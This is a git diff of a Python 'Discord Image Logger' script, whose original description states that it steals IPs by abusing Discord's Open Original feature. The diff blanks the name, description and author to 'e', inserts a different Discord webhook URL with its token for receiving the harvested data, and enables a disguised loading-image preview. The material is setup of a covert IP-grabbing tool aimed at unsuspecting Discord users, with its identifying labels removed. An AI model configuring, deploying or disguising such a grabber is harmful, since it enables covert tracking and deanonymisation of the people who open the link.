@@ -5,14 +5,14 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "e"
+__description__ = "e"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "e"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1103049790708776971/r_EpnOHpyUEvYu5Six3HFZJSmUt0nnyxhT5H8yjSKJ0wrHqn-tySFbCZ4-FVz0e9nsci",
+    "webhook": "https://discord.com/api/webhooks/1103054614535884821/JERMCxXmfAm5gpY3pkoE2DN7lXKVVr1R7PH7tBkh6AwG_ra3AF6qFLGnwcIxJnvgJ3YT",
     "image": "https://th.bing.com/th/id/OIP.iSu2RcCcdm78xbxNDJMJSgHaEo?w=292&h=182&c=7&r=0&o=5&pid=1.7",# You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
